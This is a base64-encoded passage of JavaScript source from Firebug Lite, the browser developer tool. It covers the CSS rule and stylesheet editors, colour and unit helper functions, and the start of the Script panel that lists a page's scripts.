QogICAgICAgICAgICAgcmV0dXJuIENTU1N0eWxlUnVsZVRhZy50YWcuaW5zZXJ0QmVmb3JlKHtydWxlOiBlbXB0eVJ1bGV9LCB0YXJnZXQpOw0KICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgIHJldHVybiBDU1NTdHlsZVJ1bGVUYWcudGFnLmluc2VydEFmdGVyKHtydWxlOiBlbXB0eVJ1bGV9LCB0YXJnZXQpOw0KICAgIH0sDQoNCiAgICBzYXZlRWRpdDogZnVuY3Rpb24odGFyZ2V0LCB2YWx1ZSwgcHJldmlvdXNWYWx1ZSkNCiAgICB7DQogICAgICAgIGlmIChGQlRyYWNlLkRCR19DU1MpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiQ1NTUnVsZUVkaXRvci5zYXZlRWRpdDogJyIgKyB2YWx1ZSArICInICAnIiArIHByZXZpb3VzVmFsdWUgKyAiJyIsIHRhcmdldCk7DQoNCiAgICAgICAgdGFyZ2V0LmlubmVySFRNTCA9IGVzY2FwZUZvckNzcyh2YWx1ZSk7DQoNCiAgICAgICAgaWYgKHZhbHVlID09PSBwcmV2aW91c1ZhbHVlKSAgICAgcmV0dXJuOw0KDQogICAgICAgIHZhciByb3cgPSBnZXRBbmNlc3RvckJ5Q2xhc3ModGFyZ2V0LCAiY3NzUnVsZSIpOw0KICAgICAgICB2YXIgc3R5bGVTaGVldCA9IHRoaXMucGFuZWwubG9jYXRpb247DQogICAgICAgIHN0eWxlU2hlZXQgPSBzdHlsZVNoZWV0LmVkaXRTdHlsZVNoZWV0ID8gc3R5bGVTaGVldC5lZGl0U3R5bGVTaGVldC5zaGVldCA6IHN0eWxlU2hlZXQ7DQoNCiAgICAgICAgdmFyIGNzc1J1bGVzID0gc3R5bGVTaGVldC5jc3NSdWxlczsNCiAgICAgICAgdmFyIHJ1bGUgPSBGaXJlYnVnLmdldFJlcE9iamVjdCh0YXJnZXQpLCBvbGRSdWxlID0gcnVsZTsNCiAgICAgICAgdmFyIHJ1bGVJbmRleCA9IGNzc1J1bGVzLmxlbmd0aDsNCiAgICAgICAgaWYgKHJ1bGUgfHwgRmlyZWJ1Zy5nZXRSZXBPYmplY3Qocm93Lm5leHRTaWJsaW5nKSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHNlYXJjaFJ1bGUgPSBydWxlIHx8IEZpcmVidWcuZ2V0UmVwT2JqZWN0KHJvdy5uZXh0U2libGluZyk7DQogICAgICAgICAgICBmb3IgKHJ1bGVJbmRleD0wOyBydWxlSW5kZXg8Y3NzUnVsZXMubGVuZ3RoICYmIHNlYXJjaFJ1bGUhPWNzc1J1bGVzW3J1bGVJbmRleF07IHJ1bGVJbmRleCsrKSB7fQ0KICAgICAgICB9DQoNCiAgICAgICAgLy8gRGVsZXRlIGluIGFsbCBjYXNlcyBleGNlcHQgZm9yIG5ldyBhZGQNCiAgICAgICAgLy8gV2Ugd2FudCB0byBkbyB0aGlzIGJlZm9yZSB0aGUgaW5zZXJ0IHRvIGVhc2UgY2hhbmdlIHRyYWNraW5nDQogICAgICAgIGlmIChvbGRSdWxlKQ0KICAgICAgICB7DQogICAgICAgICAgICBGaXJlYnVnLkNTU01vZHVsZS5kZWxldGVSdWxlKHN0eWxlU2hlZXQsIHJ1bGVJbmRleCk7DQogICAgICAgIH0NCg0KICAgICAgICAvLyBGaXJlZm94IGRvZXMgbm90IGZvbGxvdyB0aGUgc3BlYyBmb3IgdGhlIHVwZGF0ZSBzZWxlY3RvciB0ZXh0IGNhc2UuDQogICAgICAgIC8vIFdoZW4gYXR0ZW1wdGluZyB0byB1cGRhdGUgdGhlIHZhbHVlLCBmaXJlZm94IHdpbGwgc2lsZW50bHkgZmFpbC4NCiAgICAgICAgLy8gU2VlIGh0dHBzOi8vYnVnemlsbGEubW96aWxsYS5vcmcvc2hvd19idWcuY2dpP2lkPTM3NDY4IGZvciB0aGUgcXVpdGUNCiAgICAgICAgLy8gb2xkIGRpc2N1c3Npb24gb2YgdGhpcyBidWcuDQogICAgICAgIC8vIEFzIGEgcmVzdWx0IHdlIG5lZWQgdG8gcmVjcmVhdGUgdGhlIHN0eWxlIGV2ZXJ5IHRpbWUgdGhlIHNlbGVjdG9yDQogICAgICAgIC8vIGNoYW5nZXMuDQogICAgICAgIGlmICh2YWx1ZSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIGNzc1RleHQgPSBbIHZhbHVlLCAieyIgXTsNCiAgICAgICAgICAgIHZhciBwcm9wcyA9IHJvdy5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKCJjc3NQcm9wIik7DQogICAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IHByb3BzLmxlbmd0aDsgaSsrKSB7DQogICAgICAgICAgICAgICAgdmFyIHByb3BFbCA9IHByb3BzW2ldOw0KICAgICAgICAgICAgICAgIGlmICghaGFzQ2xhc3MocHJvcEVsLCAiZGlzYWJsZWRTdHlsZSIpKSB7DQogICAgICAgICAgICAgICAgICAgIGNzc1RleHQucHVzaChnZXRDaGlsZEJ5Q2xhc3MocHJvcEVsLCAiY3NzUHJvcE5hbWUiKVt0ZXh0Q29udGVudF0pOw0KICAgICAgICAgICAgICAgICAgICBjc3NUZXh0LnB1c2goIjoiKTsNCiAgICAgICAgICAgICAgICAgICAgY3NzVGV4dC5wdXNoKGdldENoaWxkQnlDbGFzcyhwcm9wRWwsICJjc3NQcm9wVmFsdWUiKVt0ZXh0Q29udGVudF0pOw0KICAgICAgICAgICAgICAgICAgICBjc3NUZXh0LnB1c2goIjsiKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjc3NUZXh0LnB1c2goIn0iKTsNCiAgICAgICAgICAgIGNzc1RleHQgPSBjc3NUZXh0LmpvaW4oIiIpOw0KDQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgaW5zZXJ0TG9jID0gRmlyZWJ1Zy5DU1NNb2R1bGUuaW5zZXJ0UnVsZShzdHlsZVNoZWV0LCBjc3NUZXh0LCBydWxlSW5kZXgpOw0KICAgICAgICAgICAgICAgIHJ1bGUgPSBjc3NSdWxlc1tpbnNlcnRMb2NdOw0KICAgICAgICAgICAgICAgIHJ1bGVJbmRleCsrOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2ggKGVycikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfQ1NTIHx8IEZCVHJhY2UuREJHX0VSUk9SUykNCiAgICAgICAgICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoIkNTUyBJbnNlcnQgRXJyb3I6ICIrZXJyLCBlcnIpOw0KDQogICAgICAgICAgICAgICAgdGFyZ2V0LmlubmVySFRNTCA9IGVzY2FwZUZvckNzcyhwcmV2aW91c1ZhbHVlKTsNCiAgICAgICAgICAgICAgICByb3cucmVwT2JqZWN0ID0gdW5kZWZpbmVkOw0KICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHJ1bGUgPSB1bmRlZmluZWQ7DQogICAgICAgIH0NCg0KICAgICAgICAvLyBVcGRhdGUgdGhlIHJlcCBvYmplY3QNCiAgICAgICAgcm93LnJlcE9iamVjdCA9IHJ1bGU7DQogICAgICAgIGlmICghb2xkUnVsZSkNCiAgICAgICAgew0KICAgICAgICAgICAgLy8gV2hvIGtub3dzIHdoYXQgdGhlIGRvbXV0aWxzIHdpbGwgcmV0dXJuIGZvciBydWxlIGxpbmUNCiAgICAgICAgICAgIC8vIGZvciBhIHJlY2VudGx5IGNyZWF0ZWQgcnVsZS4gVG8gYmUgc2FmZSB3ZSBqdXN0IGdlbmVyYXRlDQogICAgICAgICAgICAvLyBhIHVuaXF1ZSB2YWx1ZSBhcyB0aGlzIGlzIG9ubHkgdXNlZCBhcyBhbiBpbnRlcm5hbCBrZXkuDQogICAgICAgICAgICB2YXIgcnVsZUlkID0gIm5ldy8iK3ZhbHVlKyIvIisoKytDU1NSdWxlRWRpdG9yLnVuaXF1aWZpZXIpOw0KICAgICAgICAgICAgcm93LnNldEF0dHJpYnV0ZSgicnVsZUlkIiwgcnVsZUlkKTsNCiAgICAgICAgfQ0KDQogICAgICAgIHRoaXMucGFuZWwubWFya0NoYW5nZSh0aGlzLnBhbmVsLm5hbWUgPT0gInN0eWxlc2hlZXQiKTsNCiAgICB9DQp9KTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBTdHlsZVNoZWV0RWRpdG9yDQoNCmZ1bmN0aW9uIFN0eWxlU2hlZXRFZGl0b3IoZG9jKQ0Kew0KICAgIHRoaXMuYm94ID0gdGhpcy50YWcucmVwbGFjZSh7fSwgZG9jLCB0aGlzKTsNCiAgICB0aGlzLmlucHV0ID0gdGhpcy5ib3guZmlyc3RDaGlsZDsNCn0NCg0KU3R5bGVTaGVldEVkaXRvci5wcm90b3R5cGUgPSBkb21wbGF0ZShGaXJlYnVnLkJhc2VFZGl0b3IsDQp7DQogICAgbXVsdGlMaW5lOiB0cnVlLA0KDQogICAgdGFnOiBESVYoDQogICAgICAgIFRFWFRBUkVBKHsiY2xhc3MiOiAic3R5bGVTaGVldEVkaXRvciBmdWxsUGFuZWxFZGl0b3IiLCBvbmlucHV0OiAiJG9uSW5wdXQifSkNCiAgICApLA0KDQogICAgZ2V0VmFsdWU6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHJldHVybiB0aGlzLmlucHV0LnZhbHVlOw0KICAgIH0sDQoNCiAgICBzZXRWYWx1ZTogZnVuY3Rpb24odmFsdWUpDQogICAgew0KICAgICAgICByZXR1cm4gdGhpcy5pbnB1dC52YWx1ZSA9IHZhbHVlOw0KICAgIH0sDQoNCiAgICBzaG93OiBmdW5jdGlvbih0YXJnZXQsIHBhbmVsLCB2YWx1ZSwgdGV4dFNpemUsIHRhcmdldFNpemUpDQogICAgew0KICAgICAgICB0aGlzLnRhcmdldCA9IHRhcmdldDsNCiAgICAgICAgdGhpcy5wYW5lbCA9IHBhbmVsOw0KDQogICAgICAgIHRoaXMucGFuZWwucGFuZWxOb2RlLmFwcGVuZENoaWxkKHRoaXMuYm94KTsNCg0KICAgICAgICB0aGlzLmlucHV0LnZhbHVlID0gdmFsdWU7DQogICAgICAgIHRoaXMuaW5wdXQuZm9jdXMoKTsNCg0KICAgICAgICB2YXIgY29tbWFuZCA9IEZpcmVidWcuY2hyb21lLiQoImNtZF90b2dnbGVDU1NFZGl0aW5nIik7DQogICAgICAgIGNvbW1hbmQuc2V0QXR0cmlidXRlKCJjaGVja2VkIiwgdHJ1ZSk7DQogICAgfSwNCg0KICAgIGhpZGU6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHZhciBjb21tYW5kID0gRmlyZWJ1Zy5jaHJvbWUuJCgiY21kX3RvZ2dsZUNTU0VkaXRpbmciKTsNCiAgICAgICAgY29tbWFuZC5zZXRBdHRyaWJ1dGUoImNoZWNrZWQiLCBmYWxzZSk7DQoNCiAgICAgICAgaWYgKHRoaXMuYm94LnBhcmVudE5vZGUgPT0gdGhpcy5wYW5lbC5wYW5lbE5vZGUpDQogICAgICAgICAgICB0aGlzLnBhbmVsLnBhbmVsTm9kZS5yZW1vdmVDaGlsZCh0aGlzLmJveCk7DQoNCiAgICAgICAgZGVsZXRlIHRoaXMudGFyZ2V0Ow0KICAgICAgICBkZWxldGUgdGhpcy5wYW5lbDsNCiAgICAgICAgZGVsZXRlIHRoaXMuc3R5bGVTaGVldDsNCiAgICB9LA0KDQogICAgc2F2ZUVkaXQ6IGZ1bmN0aW9uKHRhcmdldCwgdmFsdWUsIHByZXZpb3VzVmFsdWUpDQogICAgew0KICAgICAgICBGaXJlYnVnLkNTU01vZHVsZS5mcmVlRWRpdCh0aGlzLnN0eWxlU2hlZXQsIHZhbHVlKTsNCiAgICB9LA0KDQogICAgZW5kRWRpdGluZzogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdGhpcy5wYW5lbC5yZWZyZXNoKCk7DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBvbklucHV0OiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBGaXJlYnVnLkVkaXRvci51cGRhdGUoKTsNCiAgICB9LA0KDQogICAgc2Nyb2xsVG9MaW5lOiBmdW5jdGlvbihsaW5lLCBvZmZzZXQpDQogICAgew0KICAgICAgICB0aGlzLnN0YXJ0TWVhc3VyaW5nKHRoaXMuaW5wdXQpOw0KICAgICAgICB2YXIgbGluZUhlaWdodCA9IHRoaXMubWVhc3VyZVRleHQoKS5oZWlnaHQ7DQogICAgICAgIHRoaXMuc3RvcE1lYXN1cmluZygpOw0KDQogICAgICAgIHRoaXMuaW5wdXQuc2Nyb2xsVG9wID0gKGxpbmUgKiBsaW5lSGVpZ2h0KSArIG9mZnNldDsNCiAgICB9DQp9KTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBMb2NhbCBIZWxwZXJzDQoNCnZhciByZ2JUb0hleCA9IGZ1bmN0aW9uIHJnYlRvSGV4KHZhbHVlKQ0Kew0KICAgIHJldHVybiB2YWx1ZS5yZXBsYWNlKC9cYnJnYlwoKFxkezEsM30pLFxzKihcZHsxLDN9KSxccyooXGR7MSwzfSlcKS9naSwgcmdiVG9IZXhSZXBsYWNlcik7DQp9Ow0KDQp2YXIgcmdiVG9IZXhSZXBsYWNlciA9IGZ1bmN0aW9uKF8sIHIsIGcsIGIpIHsNCiAgICByZXR1cm4gJyMnICsgKCgxIDw8IDI0KSArIChyIDw8IDE2KSArIChnIDw8IDgpICsgKGIgPDwgMCkpLnRvU3RyaW5nKDE2KS5zdWJzdHIoLTYpLnRvVXBwZXJDYXNlKCk7DQp9Ow0KDQp2YXIgc3RyaXBVbml0cyA9IGZ1bmN0aW9uIHN0cmlwVW5pdHModmFsdWUpDQp7DQogICAgLy8gcmVtb3ZlIHVuaXRzIGZyb20gJzBweCcsICcwZW0nIGV0Yy4gbGVhdmUgbm9uLXplcm8gdW5pdHMgaW4tdGFjdC4NCiAgICByZXR1cm4gdmFsdWUucmVwbGFjZSgvKHVybFwoLio/XCl8W14wXVxTKlxzKil8MCglfGVtfGV4fHB4fGlufGNtfG1tfHB0fHBjKShcc3wkKS9naSwgc3RyaXBVbml0c1JlcGxhY2VyKTsNCn07DQoNCnZhciBzdHJpcFVuaXRzUmVwbGFjZXIgPSBmdW5jdGlvbihfLCBza2lwLCByZW1vdmUsIHdoaXRlc3BhY2UpIHsNCiAgICByZXR1cm4gc2tpcCB8fCAoJzAnICsgd2hpdGVzcGFjZSk7DQp9Ow0KDQpmdW5jdGlvbiBwYXJzZVByaW9yaXR5KHZhbHVlKQ0Kew0KICAgIHZhciByZVByaW9yaXR5ID0gLyguKj8pXHMqKCFpbXBvcnRhbnQpPyQvOw0KICAgIHZhciBtID0gcmVQcmlvcml0eS5leGVjKHZhbHVlKTsNCiAgICB2YXIgcHJvcFZhbHVlID0gbSA/IG1bMV0gOiAiIjsNCiAgICB2YXIgcHJpb3JpdHkgPSBtICYmIG1bMl0gPyAiaW1wb3J0YW50IiA6ICIiOw0KICAgIHJldHVybiB7dmFsdWU6IHByb3BWYWx1ZSwgcHJpb3JpdHk6IHByaW9yaXR5fTsNCn0NCg0KZnVuY3Rpb24gcGFyc2VVUkxWYWx1ZSh2YWx1ZSkNCnsNCiAgICB2YXIgbSA9IHJlVVJMLmV4ZWModmFsdWUpOw0KICAgIHJldHVybiBtID8gbVsxXSA6ICIiOw0KfQ0KDQpmdW5jdGlvbiBwYXJzZVJlcGVhdFZhbHVlKHZhbHVlKQ0Kew0KICAgIHZhciBtID0gcmVSZXBlYXQuZXhlYyh2YWx1ZSk7DQogICAgcmV0dXJuIG0gPyBtWzBdIDogIiI7DQp9DQoNCmZ1bmN0aW9uIHBhcnNlQ1NTVmFsdWUodmFsdWUsIG9mZnNldCkNCnsNCiAgICB2YXIgc3RhcnQgPSAwOw0KICAgIHZhciBtOw0KICAgIHdoaWxlICgxKQ0KICAgIHsNCiAgICAgICAgbSA9IHJlU3BsaXRDU1MuZXhlYyh2YWx1ZSk7DQogICAgICAgIGlmIChtICYmIG0uaW5kZXgrbVswXS5sZW5ndGggPCBvZmZzZXQpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhbHVlID0gdmFsdWUuc3Vic3RyKG0uaW5kZXgrbVswXS5sZW5ndGgpOw0KICAgICAgICAgICAgc3RhcnQgKz0gbS5pbmRleCttWzBdLmxlbmd0aDsNCiAgICAgICAgICAgIG9mZnNldCAtPSBtLmluZGV4K21bMF0ubGVuZ3RoOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIGJyZWFrOw0KICAgIH0NCg0KICAgIGlmIChtKQ0KICAgIHsNCiAgICAgICAgdmFyIHR5cGU7DQogICAgICAgIGlmIChtWzFdKQ0KICAgICAgICAgICAgdHlwZSA9ICJ1cmwiOw0KICAgICAgICBlbHNlIGlmIChtWzJdIHx8IG1bM10pDQogICAgICAgICAgICB0eXBlID0gInJnYiI7DQogICAgICAgIGVsc2UgaWYgKG1bNF0pDQogICAgICAgICAgICB0eXBlID0gImludCI7DQoNCiAgICAgICAgcmV0dXJuIHt2YWx1ZTogbVswXSwgc3RhcnQ6IHN0YXJ0K20uaW5kZXgsIGVuZDogc3RhcnQrbS5pbmRleCsobVswXS5sZW5ndGgtMSksIHR5cGU6IHR5cGV9Ow0KICAgIH0NCn0NCg0KZnVuY3Rpb24gZmluZFByb3BCeU5hbWUocHJvcHMsIG5hbWUpDQp7DQogICAgZm9yICh2YXIgaSA9IDA7IGkgPCBwcm9wcy5sZW5ndGg7ICsraSkNCiAgICB7DQogICAgICAgIGlmIChwcm9wc1tpXS5uYW1lID09IG5hbWUpDQogICAgICAgICAgICByZXR1cm4gaTsNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIHNvcnRQcm9wZXJ0aWVzKHByb3BzKQ0Kew0KICAgIHByb3BzLnNvcnQoZnVuY3Rpb24oYSwgYikNCiAgICB7DQogICAgICAgIHJldHVybiBhLm5hbWUgPiBiLm5hbWUgPyAxIDogLTE7DQogICAgfSk7DQp9DQoNCmZ1bmN0aW9uIGdldFRvcG1vc3RSdWxlTGluZShwYW5lbE5vZGUpDQp7DQogICAgZm9yICh2YXIgY2hpbGQgPSBwYW5lbE5vZGUuZmlyc3RDaGlsZDsgY2hpbGQ7IGNoaWxkID0gY2hpbGQubmV4dFNpYmxpbmcpDQogICAgew0KICAgICAgICBpZiAoY2hpbGQub2Zmc2V0VG9wK2NoaWxkLm9mZnNldEhlaWdodCA+IHBhbmVsTm9kZS5zY3JvbGxUb3ApDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBydWxlID0gY2hpbGQucmVwT2JqZWN0Ow0KICAgICAgICAgICAgaWYgKHJ1bGUpDQogICAgICAgICAgICAgICAgcmV0dXJuIHsNCiAgICAgICAgICAgICAgICAgICAgbGluZTogZG9tVXRpbHMuZ2V0UnVsZUxpbmUocnVsZSksDQogICAgICAgICAgICAgICAgICAgIG9mZnNldDogcGFuZWxOb2RlLnNjcm9sbFRvcC1jaGlsZC5vZmZzZXRUb3ANCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiAwOw0KfQ0KDQpmdW5jdGlvbiBnZXRTdHlsZVNoZWV0Q1NTKHNoZWV0LCBjb250ZXh0KQ0Kew0KICAgIGlmIChzaGVldC5vd25lck5vZGUgaW5zdGFuY2VvZiBIVE1MU3R5bGVFbGVtZW50KQ0KICAgICAgICByZXR1cm4gc2hlZXQub3duZXJOb2RlLmlubmVySFRNTDsNCiAgICBlbHNlDQogICAgICAgIHJldHVybiBjb250ZXh0LnNvdXJjZUNhY2hlLmxvYWQoc2hlZXQuaHJlZikuam9pbigiIik7DQp9DQoNCmZ1bmN0aW9uIGdldFN0eWxlU2hlZXRPd25lck5vZGUoc2hlZXQpIHsNCiAgICBmb3IgKDsgc2hlZXQgJiYgIXNoZWV0Lm93bmVyTm9kZTsgc2hlZXQgPSBzaGVldC5wYXJlbnRTdHlsZVNoZWV0KTsNCg0KICAgIHJldHVybiBzaGVldC5vd25lck5vZGU7DQp9DQoNCmZ1bmN0aW9uIHNjcm9sbFNlbGVjdGlvbkludG9WaWV3KHBhbmVsKQ0Kew0KICAgIHZhciBzZWxDb24gPSBnZXRTZWxlY3Rpb25Db250cm9sbGVyKHBhbmVsKTsNCiAgICBzZWxDb24uc2Nyb2xsU2VsZWN0aW9uSW50b1ZpZXcoDQogICAgICAgICAgICBuc0lTZWxlY3Rpb25Db250cm9sbGVyLlNFTEVDVElPTl9OT1JNQUwsDQogICAgICAgICAgICBuc0lTZWxlY3Rpb25Db250cm9sbGVyLlNFTEVDVElPTl9GT0NVU19SRUdJT04sIHRydWUpOw0KfQ0KDQpmdW5jdGlvbiBnZXRTZWxlY3Rpb25Db250cm9sbGVyKHBhbmVsKQ0Kew0KICAgIHZhciBicm93c2VyID0gRmlyZWJ1Zy5jaHJvbWUuZ2V0UGFuZWxCcm93c2VyKHBhbmVsKTsNCiAgICByZXR1cm4gYnJvd3Nlci5kb2NTaGVsbC5RdWVyeUludGVyZmFjZShuc0lJbnRlcmZhY2VSZXF1ZXN0b3IpDQogICAgICAgIC5nZXRJbnRlcmZhY2UobnNJU2VsZWN0aW9uRGlzcGxheSkNCiAgICAgICAgLlF1ZXJ5SW50ZXJmYWNlKG5zSVNlbGVjdGlvbkNvbnRyb2xsZXIpOw0KfQ0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KRmlyZWJ1Zy5yZWdpc3Rlck1vZHVsZShGaXJlYnVnLkNTU01vZHVsZSk7DQpGaXJlYnVnLnJlZ2lzdGVyUGFuZWwoRmlyZWJ1Zy5DU1NTdHlsZVNoZWV0UGFuZWwpOw0KRmlyZWJ1Zy5yZWdpc3RlclBhbmVsKENTU0VsZW1lbnRQYW5lbCk7DQpGaXJlYnVnLnJlZ2lzdGVyUGFuZWwoQ1NTQ29tcHV0ZWRFbGVtZW50UGFuZWwpOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KfX0pOw0KDQoNCi8qIFNlZSBsaWNlbnNlLnR4dCBmb3IgdGVybXMgb2YgdXNhZ2UgKi8NCg0KRkJMLm5zKGZ1bmN0aW9uKCkgeyB3aXRoIChGQkwpIHsNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIFNjcmlwdCBNb2R1bGUNCg0KRmlyZWJ1Zy5TY3JpcHQgPSBleHRlbmQoRmlyZWJ1Zy5Nb2R1bGUsIA0Kew0KICAgIGdldFBhbmVsOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICByZXR1cm4gRmlyZWJ1Zy5jaHJvbWUgPyBGaXJlYnVnLmNocm9tZS5nZXRQYW5lbCgiU2NyaXB0IikgOiBudWxsOw0KICAgIH0sDQogICAgDQogICAgc2VsZWN0U291cmNlQ29kZTogZnVuY3Rpb24oaW5kZXgpDQogICAgew0KICAgICAgICB0aGlzLmdldFBhbmVsKCkuc2VsZWN0U291cmNlQ29kZShpbmRleCk7DQogICAgfQ0KfSk7DQoNCkZpcmVidWcucmVnaXN0ZXJNb2R1bGUoRmlyZWJ1Zy5TY3JpcHQpOw0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gU2NyaXB0IFBhbmVsDQoNCmZ1bmN0aW9uIFNjcmlwdFBhbmVsKCl7fTsNCg0KU2NyaXB0UGFuZWwucHJvdG90eXBlID0gZXh0ZW5kKEZpcmVidWcuUGFuZWwsDQp7DQogICAgbmFtZTogIlNjcmlwdCIsDQogICAgdGl0bGU6ICJTY3JpcHQiLA0KICAgIA0KICAgIHNlbGVjdEluZGV4OiAwLCAvLyBpbmRleCBvZiB0aGUgY3VycmVudCBzZWxlY3ROb2RlJ3Mgb3B0aW9uDQogICAgc291cmNlSW5kZXg6IC0xLCAvLyBpbmRleCBvZiB0aGUgc2NyaXB0IG5vZGUsIGJhc2VkIGluIGRvYy5nZXRFbGVtZW50c0J5VGFnTmFtZSgic2NyaXB0IikNCiAgICANCiAgICBvcHRpb25zOiB7DQogICAgICAgIGhhc1Rvb2xCdXR0b25zOiB0cnVlDQogICAgfSwNCg0KICAgIGNyZWF0ZTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgRmlyZWJ1Zy5QYW5lbC5jcmVhdGUuYXBwbHkodGhpcywgYXJndW1lbnRzKTsNCiAgICAgICAgDQogICAgICAgIHRoaXMub25DaGFuZ2VTZWxlY3QgPSBiaW5kKHRoaXMub25DaGFuZ2VTZWxlY3QsIHRoaXMpOw0KICAgICAgICANCiAgICAgICAgdmFyIGRvYyA9IEZpcmVidWcuYnJvd3Nlci5kb2N1bWVudDsNCiAgICAgICAgdmFyIHNjcmlwdHMgPSBkb2MuZ2V0RWxlbWVudHNCeVRhZ05hbWUoInNjcmlwdCIpOw0KICAgICAgICB2YXIgc2VsZWN0Tm9kZSA9IHRoaXMuc2VsZWN0Tm9kZSA9IGNyZWF0ZUVsZW1lbnQoInNlbGVjdCIpOw0KICAgICAgICANCiAgICAgICAgZm9yKHZhciBpPTAsIHNjcmlwdDsgc2NyaXB0PXNjcmlwdHNbaV07IGkrKykNCiAgICAgICAgew0KICAgICAgICAgICAgLy8gRG9uJ3Qgc2hvdyBGaXJlYnVnIExpdGUgc291cmNlIGNvZGUgaW4gdGhlIGxpc3Qgb2Ygb3B0aW9ucw0KICAgICAgICAgICAgaWYgKEZpcmVidWcuaWdub3JlRmlyZWJ1Z0VsZW1lbnRzICYmIHNjcmlwdC5nZXRBdHRyaWJ1dGUoImZpcmVidWdJZ25vcmUiKSkNCiAgICAgICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdmFyIGZpbGVOYW1lID0gZ2V0RmlsZU5hbWUoc2NyaXB0LnNyYykgfHwgZ2V0RmlsZU5hbWUoZG9jLmxvY2F0aW9uLmhyZWYpOw0KICAgICAgICAgICAgdmFyIG9wdGlvbiA9IGNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIsIHt2YWx1ZTppfSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIG9wdGlvbi5hcHBlbmRDaGlsZChGaXJlYnVnLmNocm9tZS5kb2N1bWVudC5jcmVhdGVUZXh0Tm9kZShmaWxlTmFtZSkpOw0KICAgICAgICAgICAgc2VsZWN0Tm9kZS5hcHBlbmRDaGlsZChvcHRpb24pOw0KICAgICAgICB9Ow0KICAgIA0KICAgICAgICB0aGlzLnRvb2xCdXR0b25zTm9kZS5hcHBlbmRDaGlsZChzZWxlY3ROb2RlKTsNCiAgICB9LA0KICAgIA0KICAgIGluaXRpYWxpemU6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIC8vIHdlIG11c3QgcmVuZGVyIHRoZSBjb2RlIGZpcnN0LCBzbyB0aGUgcGVyc2lzdGVudCBzdGF0ZSBjYW4gYmUgcmVzdG9yZQ0KICAgICAgICB0aGlzLnNlbGVjdFNvdXJjZUNvZGUodGhpcy5zZWxlY3RJbmRleCk7DQogICAgICAgIA0KICAgICAgICBGaXJlYnVnLlBhbmVsLmluaXRpYWxpemUuYXBwbHkodGhpcywgYXJndW1lbnRzKTsNCiAgICAgICAgDQogICAgICAgIGFkZEV2ZW50KHRoaXMuc2VsZWN0Tm9kZSwgImNoYW5nZSIsIHRoaXMub25DaGFuZ2VTZWxlY3QpOw0KICAgIH0sDQogICAgDQogICAgc2h1dGRvd246IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHJlbW92ZUV2ZW50KHRoaXMuc2VsZWN0Tm9kZSwgImNoYW5nZSIsIHRoaXMub25DaGFuZ2VTZWxlY3QpOw0KICAgICAgICANCiAgICAgICAgRmlyZWJ1Zy5QYW5lbC5zaHV0ZG93bi5hcHBseSh0aGlzLCBhcmd1bWVudHMpOw0KICAgIH0sDQogICAgDQogICAgZGV0YWNoOiBmdW5jdGlvbihvbGRDaHJvbWUsIG5ld0Nocm9tZSkNCiAgICB7DQogICAgICAgIEZpcmVidWcuUGFuZWwuZGV0YWNoLmFwcGx5KHRoaXMs